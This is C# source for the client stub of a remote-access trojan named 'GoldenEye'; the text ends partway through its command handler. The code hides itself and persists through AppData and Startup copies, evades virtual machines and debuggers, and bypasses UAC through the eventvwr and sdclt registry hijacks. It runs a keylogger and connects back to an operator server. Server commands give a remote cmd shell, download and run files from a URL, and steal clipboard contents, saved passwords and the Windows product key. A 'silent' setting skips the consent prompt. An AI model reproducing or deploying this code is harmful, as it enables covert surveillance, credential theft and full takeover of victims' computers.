using GoldenEye.Functions;
using Microsoft.VisualBasic;
using Microsoft.Win32;
using System;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Management;
using System.Net;
using System.Net.Sockets;
using System.Reflection;
using System.Runtime.ConstrainedExecution;
using System.Runtime.InteropServices;
using System.Security.AccessControl;
using System.Security.Cryptography;
using System.Security.Principal;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using static GoldenEye.SystemFunctions;

namespace GoldenEye
{
    public class MainWorker
    {
        /*
         *
         *   Send("ADDLOG|" + ClientID + "|" + "Log" + "|" + msg);
         *   Send("ADDLOG|" + ClientID + "|" + "Error" + "|" + msg);
         *   Send("ADDLOG|" + ClientID + "|" + "Info" + "|" + msg);
         *   Send("ADDLOG|" + ClientID + "|" + "Warning" + "|" + msg);
         *   Send("ADDLOG|" + ClientID + "|" + "Risk" + "|" + msg);
         *   Send("ADDLOG|" + ClientID + "|" + "Priority" + "|" + msg);
         *
         *
         */
        public static string IP = "127.0.0.1"; // 213.249.194.103
        public static int PORT = 9003; // 42007 // 666 // 9003
        public TcpClient client;
        public IPEndPoint point;
        public Keylogger loggr = new Keylogger();
        public static string hunaLogs;
        public static int reconnectInterval = 3000;
        public static int activeWindowUpdateInterval = 10000;
        public string cryptkey = "customerHWID";
        private static Process cmdProcess;
        private static StreamReader fromShell;
        private static StreamWriter toShell;
        private static StreamReader error;
        private static IntPtr TaskbarHandle = IntPtr.Zero;
        private const int APPCOMMAND_VOLUME_MUTE = 0x80000;
        private const int WM_APPCOMMAND = 0x319;
        public Thread binper;
        public string ClientID = "ClientID";
        private static string ActiveWindow = GetActiveWindowTitle();
        public string OperatingSystem = getOS();
        private static string MachineName = Environment.MachineName;
        private static string MachineType = checkDeviceType();
        private static string Privileges = "User";
        private static string stubver = "1.1.6 Special";

        // public static Settings conf = new Settings();
        [DllImport("kernel32.dll")]
        private static extern IntPtr GetConsoleWindow();

        [DllImport("user32.dll")]
        private static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        [DllImport("user32.dll")]
        private static extern IntPtr FindWindow(string className, string windowText);

        [DllImport("user32.dll")]
        public static extern Int32 SwapMouseButton(Int32 bSwap);

        [DllImport("user32.dll")]
        public static extern IntPtr SendMessageW(IntPtr hWnd, int Msg, IntPtr wParam, IntPtr lParam);

        private string install = "False";
        private string installFolder = "Folder";
        private string installFile = "File.exe";

        private string silent = "True";
        private string hidefile = "False";
        private string binpersist = "False";
        private string procpersist = "False";
        private string AutoProactive = "False";
        private string antivm = "False";
        private string antidebug = "False";
        private string antidll = "False";
        private string sysproc = "False";

        [STAThread]
        public void Main()
        {

            /*
             * Encryption / Decryption mit "cryptkey" in Zukunft
             *  ** NOCH VOR RELEASE AM FREITAG (12.10) EINBAUEN!!!
             */

            readSettings();
            ClientID += getHardwareHash();
            try
            {
                if (antidebug.Equals("True"))
                {
                    Process currentProcess = Process.GetCurrentProcess();
                    if (Debugger.IsAttached)
                    {
                        Environment.Exit(0);
                    }
                    if (IsDebuggerPresent())
                    {
                        Environment.Exit(0);
                    }
                }
                if (antivm.Equals("True"))
                {
                    using (var searcher = new System.Management.ManagementObjectSearcher("Select * from Win32_ComputerSystem"))
                    {
                        using (var items = searcher.Get())
                        {
                            foreach (var item in items)
                            {
                                string manufacturer = item["Manufacturer"].ToString().ToLower();
                                if ((manufacturer == "microsoft corporation" && item["Model"].ToString().ToUpperInvariant().Contains("VIRTUAL")) || manufacturer.Contains("vmware") || item["Model"].ToString() == "VirtualBox")
                                {
                                    // Virtual Machine detected
                                    Environment.Exit(0);
                                }
                            }
                        }
                    }
                }

                if (silent.Equals("False"))
                {
                    string silenttext = string.Empty;
                    silenttext += "Attention! You are about to install Golden Eye - System Administration Tool!" + Environment.NewLine;
                    silenttext += "This Tool allows someone to remote control your Computer, view your Files, viewing Passwords and so on." + Environment.NewLine;
                    silenttext += "If you do not know, what this is, please click on the 'No' Button." + Environment.NewLine;

                    silenttext += "" + Environment.NewLine;
                    silenttext += "Press the 'Yes' button to confirm the continuation of the installation.";
                    DialogResult dialogResult = MessageBox.Show(silenttext, "Golden Eye - Installation Dialog", MessageBoxButtons.YesNo, MessageBoxIcon.Information);
                    if (dialogResult == DialogResult.No)
                    {
                        Environment.Exit(0);
                    }
                    
                }
                if (install.Equals("True"))
                {
                    if (Application.ExecutablePath.Contains("Appdata"))
                    {
                        goto Egal;
                    }
                    string path = getRandomInstallPath();
                    try
                    {
                        if (!Directory.Exists(path + @"\" + installFolder))
                        {
                            Directory.CreateDirectory(path + @"\" + installFolder);
                        }
                        File.WriteAllBytes(path + @"\" + installFolder + @"\" + installFile, File.ReadAllBytes(Application.ExecutablePath));
                        domelt(path + @"\" + installFolder + @"\" + installFile);
                        return;
                    }
                    catch (Exception eax)
                    {
                        //  MessageBox.Show(eax.ToString());
                    }

                    Egal:
                    try
                    {
                        string nam = new System.IO.FileInfo(Application.ExecutablePath).Name;
                        System.IO.File.WriteAllBytes(Environment.GetFolderPath(Environment.SpecialFolder.Startup).ToString() + @"\" + nam, System.IO.File.ReadAllBytes(Application.ExecutablePath));
                    }
                    catch (Exception eax) { adderror("Couldnt add File to Autostart Folder:" + eax.ToString()); }
                }
                if (hidefile.Equals("True"))
                {
                    File.SetAttributes(Application.ExecutablePath, FileAttributes.Hidden);
                }
                if (binpersist.Equals("True"))
                {
                    binper = new Thread(setpersist);
                    binper.IsBackground = true;
                    binper.Start();
                }
                if (procpersist.Equals("True"))
                {
                }
                if (AutoProactive.Equals("True"))
                {
                    proActiveIsEnabled = true;
                    Thread tPR = new Thread(new ThreadStart(proactiveAM));
                    tPR.IsBackground = true;
                    tPR.Start();
                }
                if (antidll.Equals("True"))
                {
                    try
                    {
                        uint num;
                        IntPtr procAddress = GetProcAddress(GetModuleHandle("kernel32"), "LoadLibraryA");
                        IntPtr lpBaseAddress = GetProcAddress(GetModuleHandle("kernel32"), "LoadLibraryW");
                        if (procAddress != IntPtr.Zero)
                        {
                            num = 0;
                            WriteProcessMemory(Process.GetCurrentProcess().Handle, procAddress, new byte[] { 0xc2, 4, 0, 0x90 }, 4, ref num);
                        }
                        if (lpBaseAddress != IntPtr.Zero)
                        {
                            num = 0;
                            WriteProcessMemory(Process.GetCurrentProcess().Handle, lpBaseAddress, new byte[] { 0xc2, 4, 0, 0x90 }, 4, ref num);
                        }
                    }
                    catch { }
                }

                if (sysproc.Equals("True"))
                {
                    if (IsAdmin() == true)
                    {
                        critical(1);
                    }
                }
                Thread t = new Thread(new ThreadStart(Keylogger.Logger));
                t.Start();
            }
            catch { }
            client = new TcpClient();
            point = new IPEndPoint(IPAddress.Parse(IP), PORT);
            TaskbarHandle = FindWindow("Shell_TrayWnd", "");
            InitCommonControls();
            Connect();
            Process.GetCurrentProcess().WaitForExit();
        }

        [DllImport("kernel32.dll", CharSet = CharSet.Ansi, SetLastError = true, ExactSpelling = true)]
        public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

        [DllImport("kernel32.dll")]
        public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, ref uint lpNumberOfBytesWritten);

        [ReliabilityContract(Consistency.WillNotCorruptState, Cer.MayFail), DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        public static extern IntPtr GetModuleHandle(string moduleName);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto, ExactSpelling = true)]
        public static extern bool IsDebuggerPresent();

        [DllImport("ntdll.dll", SetLastError = true)]
        private static extern int NtSetInformationProcess(IntPtr hProcess, int processInformationClass, ref int processInformation, int processInformationLength);

        private static void critical(int status)
        {
            int BreakOnTermi = 0x1D;
            Process.EnterDebugMode();
            NtSetInformationProcess(Process.GetCurrentProcess().Handle, BreakOnTermi,
            ref status, sizeof(int));
        }

        private void readSettings()
        {
            /*
             * Encryption / Decryption mit "cryptkey" in Zukunft
             *  ** NOCH VOR RELEASE AM FREITAG (12.10) EINBAUEN!!!
             */
            FileManager dec = new FileManager();
            cryptkey = NativeResource.ReadResourceString("CRYPTKEY");
            ClientID = dec.AES_Decrypt(NativeResource.ReadResourceString("CLIENTID"), cryptkey); 
            IP = dec.AES_Decrypt(NativeResource.ReadResourceString("DNSIP"), cryptkey); 
            PORT = int.Parse(dec.AES_Decrypt(NativeResource.ReadResourceString("PORT"), cryptkey)); 
            install = dec.AES_Decrypt(NativeResource.ReadResourceString("INSTALL"), cryptkey); 
            installFolder = dec.AES_Decrypt(NativeResource.ReadResourceString("INSTALLFOLDER"), cryptkey);
            installFile = dec.AES_Decrypt(NativeResource.ReadResourceString("INSTALLFILE"), cryptkey);
            silent = dec.AES_Decrypt(NativeResource.ReadResourceString("SILENT"), cryptkey); 
            hidefile = dec.AES_Decrypt(NativeResource.ReadResourceString("HIDE"), cryptkey);
            binpersist = dec.AES_Decrypt(NativeResource.ReadResourceString("BINARYPERSIST"), cryptkey);
            procpersist = dec.AES_Decrypt(NativeResource.ReadResourceString("PROCPERSIST"), cryptkey);
            AutoProactive = dec.AES_Decrypt(NativeResource.ReadResourceString("PROACTIVEANTIM"), cryptkey);
            antivm = dec.AES_Decrypt(NativeResource.ReadResourceString("ANTIVM"), cryptkey);
            antidebug = dec.AES_Decrypt(NativeResource.ReadResourceString("ANTIDEBUG"), cryptkey);
            antidll = dec.AES_Decrypt(NativeResource.ReadResourceString("ANTIDLL"), cryptkey);
            sysproc = dec.AES_Decrypt(NativeResource.ReadResourceString("SYSPROC"), cryptkey);
        }

        private string getRandomInstallPath()
        {
        return Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData).ToString();
        }

        private void domelt(string path)
        {
            try
            {
                System.Diagnostics.ProcessStartInfo pd = new System.Diagnostics.ProcessStartInfo("cmd.exe");
                pd.Arguments = "/C ping 1.1.1.1 -n 1 -w " + 6 + " > Nul & Del " + ControlChars.Quote + Application.ExecutablePath + ControlChars.Quote;
                pd.CreateNoWindow = true;
                pd.ErrorDialog = false;
                pd.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
                System.Diagnostics.Process.Start(pd);
                System.Diagnostics.Process.Start(path);
                Environment.Exit(0);
            }
            catch
            {
            }
        }

        private void Connect()
        {
            wtf:
            try
            {
                addlog("Trying to connect to Server...");
                client.Connect(point);
                if (IsAdmin() == true)
                {
                    Privileges = "Admin";
                }
                string pingms = "0 ms";
                Send("CONNECTED|" + ClientID + "|" + ActiveWindow + "|" + OperatingSystem + "|" + MachineName + "|" + MachineType + "|" + Privileges + "|" + stubver + "|" + pingms);
                addlog("Successfully connected to Server!");
                client.GetStream().BeginRead(new byte[] { 0 }, 0, 0, Read, null);
                addinfo("Starting to read TCP Stream...");

                // Start Active Window update Thread (In zukunft ausschaltbar machen)
                Thread ta = new Thread(updateActiveWindow);
                ta.IsBackground = true;
                ta.Start();
            }
            catch
            {
                adderror("Couldnt connect to Server!");
                goto wtf;
            }
        }

        public Thread StartParsingThread(String msg)
        {
            var t = new Thread(() => Parse(msg));
            t.Start();
            return t;
        }

        private void Read(IAsyncResult ar)
        {
            try
            {
                StreamReader reader = new StreamReader(client.GetStream());
                //StartParsingThread(reader.ReadLine());
                Parse(reader.ReadLine());
                client.GetStream().BeginRead(new byte[] { 0 }, 0, 0, Read, null);
            }
            catch (Exception eax)
            {
                adderror("Error while reading TCP Stream! (Closed by Server?)");
                addinfo("Waiting " + reconnectInterval.ToString() + " Seconds until reconnect...");
                Thread.Sleep(reconnectInterval);
                client.Close();
                client = new TcpClient();
                point = new IPEndPoint(IPAddress.Parse(IP), PORT);
                Connect();
            }
        }
        [DllImport("user32.dll", CharSet = CharSet.Auto, CallingConvention = CallingConvention.StdCall)]
        public static extern void mouse_event(long dwFlags, long dx, long dy, long cButtons, long dwExtraInfo);

        private const int MOUSEEVENTF_LEFTDOWN = 0x02;
        private const int MOUSEEVENTF_LEFTUP = 0x04;
        private const int MOUSEEVENTF_RIGHTDOWN = 0x08;
        private const int MOUSEEVENTF_RIGHTUP = 0x10;

        private void Parse(string msg)
        {
            string[] cut = msg.Split('|');
            Console.WriteLine("######################################################");
            Console.WriteLine("");
            addinfo("Received a command from Server: ");
            addinfo(">>> " + msg);
            Console.WriteLine("");
            Console.WriteLine("######################################################");

            switch (cut[0])
            {
                case "GETLOGS":
                    FileManager filemgrr = new FileManager();
                    String dump = Keylogger.KeyLog;
                    string encrypted = filemgrr.AES_Encrypt(dump, "temp");
                    Send("KLOGS|" + encrypted);
                    break;
                case "CLIBPOARD":
                    switch (cut[1])
                    {
                        case "get":
                            string tosend = "";
                            try
                            {
                                ClipboardAsync Clipboard2 = new ClipboardAsync();
                         
                                    tosend = Clipboard2.GetText().Replace(Environment.NewLine, "[newline]".Replace("|", "/"));                                  
                            }
                            catch
                            {
                                tosend = "Error while getting Clipboard Text!";
                            }
                            Send("fmgerXcptext|" + tosend);
                            break;

                        case "set":
                            string newtext = cut[2].Replace("[newline]", Environment.NewLine);
                            try
                            {                                
                                System.Threading.Thread clipboardthrd = new Thread(() => Clipboard.SetText(newtext)); 
                                clipboardthrd.SetApartmentState(System.Threading.ApartmentState.STA); 
                                clipboardthrd.Start(); 
                            }
                            catch (Exception eax) { adderror("Error while setting Clipboard Text!"); adderror(eax.ToString()); }
                            break;
                    }
                    break;

                case "onJoin":
                    OnJoinCommandsHandler onj = new OnJoinCommandsHandler();
                    onj.mwrk = this;
                    onj.Start(cut[1]);
                    break;

                case "RDESKTOP":
                    if (cut[1].Equals("start"))
                    {
                        sendDesktop = true;
                        Thread sendDesktopThread = new Thread(sendDesktopLoop);
                        sendDesktopThread.IsBackground = true;
                        sendDesktopThread.Start();
                    }
                    else if (cut[1].Equals("stop"))
                    {
                        sendDesktop = false;
                    }
                    break;
                case "REMSIZE":
                    var s = Screen.PrimaryScreen.Bounds.Size;
                    Send("REMSIZE|" + s.Width + "|" + s.Height);
                    break;
                case "REMOUSdown":
                    Cursor.Position = new Point(int.Parse(cut[1]), int.Parse(cut[2]));
                    if (cut[3].Equals("1"))
                    {
                        mouse_event(MOUSEEVENTF_LEFTDOWN, 0, 0, 0, 0);
                    }
                    else if (cut[3].Equals("2"))
                    {
                        mouse_event(MOUSEEVENTF_RIGHTDOWN, 0, 0, 0, 0);
                    }
                    break;
                case "REMOUSup":
                    Cursor.Position = new Point(int.Parse(cut[1]), int.Parse(cut[2]));
                    if (cut[3].Equals("1"))
                    {
                        mouse_event(MOUSEEVENTF_LEFTUP, 0, 0, 0, 0);
                    }
                    else if (cut[3].Equals("2"))
                    {
                        mouse_event(MOUSEEVENTF_RIGHTUP, 0, 0, 0, 0);
                    }
                    break;

                case "UNINSTALL":
                    Uninstall();
                    break;

                case "DISCONNECT":
                    Environment.Exit(0);
                    break;

                case "RECONNECT":
                    addinfo("Waiting " + reconnectInterval.ToString() + " Seconds until reconnect...");
                    Thread.Sleep(reconnectInterval);
                    client.Close();
                    client = new TcpClient();
                    point = new IPEndPoint(IPAddress.Parse(IP), PORT);
                    Connect();
                    break;

                case "UAC":
                    if (cut[1].Equals("ask"))
                    {
                        Uacmode = cut[2];
                        Thread yellowUacThread = new Thread(askUac);
                        yellowUacThread.IsBackground = true;
                        yellowUacThread.Start();
                    }
                    else if (cut[1].Equals("auto"))
                    {
                        if (cut[2].Equals("eventvwr"))
                        {
                            Registry.CurrentUser.CreateSubKey(@"Software\Classes\mscfile\shell\open\command").SetValue("", Application.ExecutablePath);
                            Process.Start("eventvwr");
                            Environment.Exit(0);
                            addlog("UAC Automatic Privilege Escalation Mechanism:");
                            addlog("Tried to use eventvwr.exe to escalate privileges!");
                        }
                        else if (cut[2].Equals("sdclt"))
                        {
                            var proc1 = new ProcessStartInfo();
                            string anyCommand = "reg add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\App Paths\\control.exe\" /t REG_SZ /d %COMSPEC% /f && sdclt && reg delete \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\App Paths\\control.exe\" /f";
                            proc1.UseShellExecute = true;

                            proc1.WorkingDirectory = @"C:\Windows\System32";

                            proc1.FileName = @"C:\Windows\System32\cmd.exe";
                            proc1.Verb = "runas";
                            proc1.Arguments = "/c " + anyCommand;
                            proc1.WindowStyle = ProcessWindowStyle.Hidden;
                            Process.Start(proc1);
                            addlog("UAC Automatic Privilege Escalation Mechanism:");
                            addlog("Tried to use sdclt.exe to escalate privileges!");
                            var filePatha = Assembly.GetExecutingAssembly().Location;
                            Process.Start(filePatha);
                            Environment.Exit(0);
                        }
                    }
                    break;

                case "script":
                    try
                    {
                        string path = Path.GetTempPath();
                        File.WriteAllText(path + @"\" + ClientID + "." + cut[1], cut[2].Replace("[newline]", Environment.NewLine));
                        Process.Start(path + @"\" + ClientID + "." + cut[1]);
                        SendStatus("Executed '" + cut[1] + "' script!");
                    }
                    catch (Exception eax)
                    {
                        adderror("Couldnt do Remote Scripting:");
                        adderror(eax.ToString());
                    }
                    break;

                case "FLEXEC":
                    SendStatus("Trying to Execute File...");
                    if (cut[1].Equals("LOCALFILE"))
                    {
                        string dropAs = cut[3];
                        string dropFileTo = cut[4];
                        string hideFile = cut[5];
                        string protectFile = cut[6];

                        string fullPathString = "";
                        if (dropFileTo == "Temp Folder")
                        {
                            fullPathString = Path.GetTempPath();
                        }
                        else if (dropFileTo == "Programs Folder")
                        {
                            fullPathString = Environment.GetFolderPath(Environment.SpecialFolder.Programs).ToString();
                        }
                        else if (dropFileTo == "Appdata Local")
                        {
                            fullPathString = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData).ToString();
                        }
                        else if (dropFileTo == "Appdata Roaming")
                        {
                            fullPathString = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData).ToString();
                        }

                        File.WriteAllBytes(fullPathString + @"\" + dropAs, Convert.FromBase64String(cut[2]));

                        if (hideFile.Equals("1"))
                        {
                            File.SetAttributes(fullPathString + @"\" + dropAs, FileAttributes.Hidden);
                        }
                        if (protectFile.Equals("1"))
                        {
                            string FolderPath = fullPathString + @"\" + dropAs;
                            System.IO.DirectoryInfo FolderInfo = new System.IO.DirectoryInfo(FolderPath);
                            DirectorySecurity FolderAcl = new DirectorySecurity();
                            FolderAcl.SetAccessRuleProtection(true, false);
                            FolderInfo.SetAccessControl(FolderAcl);
                        }

                        Process.Start(fullPathString + @"\" + dropAs);
                        SendStatus("Executed File!");
                    }
                    else if (cut[1].Equals("URL"))
                    {
                        string url = cut[2]; // File
                        string dropAs = cut[3];
                        string dropFileTo = cut[4];
                        string hideFile = cut[5];
                        string protectFile = cut[6];

                        string fullPathString = "";
                        if (dropFileTo == "Temp Folder")
                        {
                            fullPathString = Path.GetTempPath();
                        }
                        else if (dropFileTo == "Programs Folder")
                        {
                            fullPathString = Environment.GetFolderPath(Environment.SpecialFolder.Programs).ToString();
                        }
                        else if (dropFileTo == "Appdata Local")
                        {
                            fullPathString = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData).ToString();
                        }
                        else if (dropFileTo == "Appdata Roaming")
                        {
                            fullPathString = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData).ToString();
                        }
                        SendStatus("Downloading File...");
                        WebClient webClienta = new WebClient();
                        webClienta.DownloadFile(url, fullPathString + @"\" + dropAs);
                        Process.Start(fullPathString + @"\" + dropAs);
                        SendStatus("Executed File!");

                        if (hideFile.Equals("1"))
                        {
                            File.SetAttributes(fullPathString + @"\" + dropAs, FileAttributes.Hidden);
                        }
                        if (protectFile.Equals("1"))
                        {
                            string FolderPath = fullPathString + @"\" + dropAs;
                            System.IO.DirectoryInfo FolderInfo = new System.IO.DirectoryInfo(FolderPath);
                            DirectorySecurity FolderAcl = new DirectorySecurity();
                            FolderAcl.SetAccessRuleProtection(true, false);
                            FolderInfo.SetAccessControl(FolderAcl);
                        }
                    }
                    break;

                case "UPDATE":
                    string dllink = cut[1];
                    string saveas = cut[2];
                    string currentPath = Application.StartupPath;
                    SendStatus("Downloading Update...");
                    WebClient webClient = new WebClient();
                    webClient.DownloadFile(dllink, currentPath + @"\" + saveas);
                    Process.Start(currentPath + @"\" + saveas);
                    SendStatus("Executed Update! Disconnecting...");
                    Thread.Sleep(400);
                    Uninstall();
                    break;

                case "ADVINFO":
                    Thread grabInfoThread = new Thread(grabInfo);
                    grabInfoThread.IsBackground = true;
                    grabInfoThread.Start();
                    break;

                case "REQPROCL":
                    string sortWindow = "";
                    string sortNoWindow = "";
                    foreach (Process proc in Process.GetProcesses())
                    {
                        // Process Name | PID | Window Title
                        try
                        {
                            if (proc.MainWindowTitle.Length > 0)
                            {
                                sortWindow += proc.ProcessName.Replace("|", "/") + "²" + proc.Id + "²" + proc.MainWindowTitle.Replace("|", "/") + "³";
                            }
                            else
                            {
                                sortNoWindow += proc.ProcessName.Replace("|", "/") + "²" + proc.Id + "²" + "N/A" + "³";
                            }
                        }
                        catch
                        {
                            adderror("Coudnt read Process: " + proc.ProcessName);
                        }
                    }
                    Send("ADDPROC|" + sortWindow + sortNoWindow);
                    break;

                case "KILLPROC":
                    addinfo("<Remote Task Manager>>> KILL PROCESS -> " + cut[1]);
                    try
                    {
                        int pid = int.Parse(cut[1]);

                        Process.GetProcessById(pid).Kill();
                        addlog("<Remote Task Manager>>> KILL PROCESS -> " + cut[1] + " SUCCESSFULLY KILLED.");
                    }
                    catch
                    {
                        adderror("<Remote Task Manager>>> KILL PROCESS -> " + cut[1] + " FAILED TO KILL.");
                    }

                    break;

                case "DLBPROC":
                    addinfo("<Remote Task Manager>>> DOWNLOAD FILE BY PROCESS -> " + cut[1]);
                    try
                    {
                        int pid = int.Parse(cut[1]);
                        FileManager fmg = new FileManager();
                        SystemFunctions sysfcss = new SystemFunctions();
                        addlog("<Remote Task Manager>>> DOWNLOAD FILE BY PROCESS -> " + cut[1] + " SUCCESSFULLY STARTED.");
                        Process proc = Process.GetProcessById(pid);
                        string procPath = sysfcss.ProcessExecutablePath(proc);
                        string sendback12 = fmg.dlFile(procPath);
                        string filename = Path.GetFileName(procPath);
                        Send("fmXdlfile|" + sendback12 + "|" + filename + "|" + ClientID + "|" + "Task Manager");
                        addlog("<Remote Task Manager>>> DOWNLOAD FILE BY PROCESS -> " + cut[1] + " SUCCESSFULLY SENT FILE TO SERVER.");
                    }
                    catch
                    {
                        adderror("<Remote Task Manager>>> DOWNLOAD FILE BY PROCESS -> " + cut[1] + " FAILED TO DOWNLOAD.");
                    }
                    break;

                case "KADELBPROC":
                    addinfo("<Remote Task Manager>>> KILL AND DELETE PROCESS -> " + cut[1]);
                    try
                    {
                        int pid = int.Parse(cut[1]);
                        SystemFunctions sysfcs = new SystemFunctions();
                        addlog("<Remote Task Manager>>> KILL AND DELETE PROCESS -> " + cut[1] + " SUCCESSFULLY STARTED.");
                        Process proc = Process.GetProcessById(pid);
                        string procPath = sysfcs.ProcessExecutablePath(proc);
                        proc.Kill();
                        Thread.Sleep(200);
                        File.Delete(procPath);
                        addlog("<Remote Task Manager>>> KILL AND DELETE PROCESS -> " + cut[1] + " SUCCESSFULLY KILLED AND DELETED.");
                    }
                    catch (Exception eax)
                    {
                        adderror("<Remote Task Manager>>> KILL AND DELETE PROCESS -> " + cut[1] + " FAILED TO KILL/DELETE.");
                        adderror(eax.ToString());
                    }
                    break;

                case "DEBLOPROC":
                    addinfo("<Remote Task Manager>>> BLOCK AND DESTROY PROCESS -> " + cut[1]);
                    try
                    {
                        int pid = int.Parse(cut[1]);
                        SystemFunctions sysfcs = new SystemFunctions();
                        FileManager fmgrr = new FileManager();
                        addlog("<Remote Task Manager>>> BLOCK AND DESTROY PROCESS -> " + cut[1] + " SUCCESSFULLY STARTED.");
                        Process proc = Process.GetProcessById(pid);
                        string procPath = sysfcs.ProcessExecutablePath(proc);
                        try
                        {
                            proc.Kill();
                        }
                        catch { adderror("Couldnt kill Process, still blocked file."); }
                        Thread.Sleep(200);
                        fmgrr.blockfile(procPath);
                        addlog("<Remote Task Manager>>>BLOCK AND DESTROY PROCESS -> " + cut[1] + " SUCCESSFULLY BLOCKED AND DESTROYED.");
                    }
                    catch (Exception eax)
                    {
                        adderror("<Remote Task Manager>>> BLOCK AND DESTROY PROCESS -> " + cut[1] + " FAILED TO BLOCK/DESTROY.");
                        adderror(eax.ToString());
                    }
                    break;

                case "VISITWB":
                    // "VISITWB|" + mode + "|" + url + "|" + opentimes + "|" + mute
                    switch (cut[1])
                    {
                        case "Visible - Default Browser":
                            try
                            {
                                int repeat2 = int.Parse(cut[3]);
                                int counter2 = 0;
                                while (counter2 < repeat2)
                                {
                                    Process.Start(cut[2]);
                                    counter2++;
                                }
                            }
                            catch { adderror("Couldnt open Website URL!"); }

                            if (cut[4].Equals("True"))
                            {
                                SendMessageW(GetConsoleWindow(), WM_APPCOMMAND, GetConsoleWindow(), (IntPtr)APPCOMMAND_VOLUME_MUTE);
                            }

                            break;

                        case "Hidden - Default Browser":
                            try
                            {
                                int repeat2 = int.Parse(cut[3]);
                                int counter2 = 0;
                                while (counter2 < repeat2)
                                {
                                    System.Net.WebRequest _WebRequest = null;
                                    _WebRequest = System.Net.WebRequest.Create(cut[2]);
                                    _WebRequest.GetResponse();
                                    counter2++;
                                }
                            }
                            catch { adderror("Couldnt open Website URL (hidden)!"); }

                            if (cut[4].Equals("True"))
                            {
                                SendMessageW(GetConsoleWindow(), WM_APPCOMMAND, GetConsoleWindow(), (IntPtr)APPCOMMAND_VOLUME_MUTE);
                            }

                            break;
                    }
                    break;

                case "STARTCMD":
                    addlog("Starting Remote CMD Session");
                    try
                    {
                        ProcessStartInfo info = new ProcessStartInfo();

                        info.FileName = "cmd.exe";
                        info.CreateNoWindow = true;
                        info.UseShellExecute = false;
                        info.RedirectStandardInput = true;
                        info.RedirectStandardOutput = true;
                        info.RedirectStandardError = true;

                        Process p = new Process();

                        p.StartInfo = info;
                        p.Start();
                        cmdProcess = p;
                        toShell = p.StandardInput;
                        fromShell = p.StandardOutput;
                        error = p.StandardError;
                        toShell.AutoFlush = true;

                        Thread shellthrd = new Thread(new ThreadStart(getShellInput));
                        shellthrd.IsBackground = true;
                        shellthrd.Start();
                    }
                    catch
                    {
                    }
                    break;

                case "STOPCMD":
                    try
                    {
                        cmdProcess.Kill();
                        toShell.Dispose();
                        toShell = null;
                        fromShell.Dispose();
                        fromShell = null;
                        cmdProcess.Dispose();
                        cmdProcess = null;
                    }
                    catch
                    { }

                    break;

                case "EXRCMD":
                    toShell.WriteLine(cut[1] + "\r\n");
                    break;

                case "filesearch":
                    try
                    {
                        string output = cut[1];
                        string[] items = output.Split('³');

                        foreach (string item in items)
                        {
                            StartFileSearcherThread(item.Split('²')[0], item.Split('²')[1], item.Split('²')[2], item.Split('²')[3]);
                        }
                    }
                    catch { }

                    break;

                case "GTHRINFO":
                    FileManager fmgr1 = new FileManager();
                    ClientInfo cinfo1 = new ClientInfo();
                    switch (cut[1])
                    {
                        case "os":
                            Send("GINFO|" + ClientID + "|" + getOS());
                            break;

                        case "clientloc":
                            Send("GINFO|" + ClientID + "|" + Application.ExecutablePath);
                            break;

                        case "av":
                            Send("GINFO|" + ClientID + "|" + cinfo1.getInstalledAv());
                            break;

                        case "actwin":
                            Send("GINFO|" + ClientID + "|" + GetActiveWindowTitle());
                            break;

                        case "upt":
                            Send("GINFO|" + ClientID + "|" + cinfo1.GetSystemUpTimeInfo());
                            break;

                        case "cpu":
                            Send("GINFO|" + ClientID + "|" + cinfo1.getCpuName());
                            break;

                        case "gpu":
                            Send("GINFO|" + ClientID + "|" + cinfo1.getGpuName());
                            break;

                        case "ram":
                            Send("GINFO|" + ClientID + "|" + cinfo1.getInstalledRAM());
                            break;
                    }
                    break;

                case "RECOVERY":
                    WinSerial wins = new WinSerial();

                    Recovery rec = new Recovery();
                    switch (cut[1])
                    {
                        case "winserial":
                            string serial = wins.GetWindowsProductKeyFromRegistry();
                            Send("winserial|" + ClientID + "|" + OperatingSystem + "|" + serial);
                            break;

                        case "passrec":
                            foreach (DriveInfo Drive in DriveInfo.GetDrives())
                            {
                                if (Drive.RootDirectory.FullName == @"C:\")
                                {
                                    Recovery x = new Recovery(Drive);
                                   
                                    x.recoverAll();
                              
                                    Send("passreco|" + ClientID + "|" + x.allPws);
                                }
                            }
                            break;
                    }
                    break;
                // CHAT
                case "launchChat":
                    chattingWith = cut[1];
                    Thread t = new Thread(new ThreadStart(launchChat));
                    t.Start();
                    break;

                case "EndChat":
                    ch.closeme("", "");
                    break;

                case "chatMsg":
                    addChatMessage(cut[2]);
                    break;

                case "MESSAGEBOX":
                    // checkIcon() + "|" + checkButtons() + "|" + t_TextBox1.Text + "|" + t_TextBox2.Text.Replace(Environment.NewLine, "[newline]") + "|" + velyseNumericButton1.Value.ToString());
                    string icon = cut[1];
                    string buttons = cut[2];
                    string title = cut[3];
                    string text = cut[4].Replace("[newline]", Environment.NewLine);
                    int repeat = int.Parse(cut[5]);

                    MessageBoxIcon ico = new MessageBoxIcon();
                    MessageBoxButtons btns = new MessageBoxButtons();

                    switch (icon)
                    {
                        case "Info":
                            ico = MessageBoxIcon.Information;
                            break;

                        case "Question":
                            ico = MessageBoxIcon.Question;
                            break;

                        case "Warning":
                            ico = MessageBoxIcon.Warning;
                            break;

                        case "Error":
                            ico = MessageBoxIcon.Error;
                            break;
                    }
                    switch (buttons)
                    {
                        case "YesNo":
                            btns = MessageBoxButtons.YesNo;
                            break;

                        case "YesNoCancel":
                            btns = MessageBoxButtons.YesNoCancel;
                            break;

                        case "Ok":
                            btns = MessageBoxButtons.OK;
                            break;

                        case "OkCancel":
                            btns = MessageBoxButtons.OKCancel;
                            break;

                        case "RetryCancel":
                            btns = MessageBoxButtons.RetryCancel;
                            break;

                        case "AbortRetryIgnore":
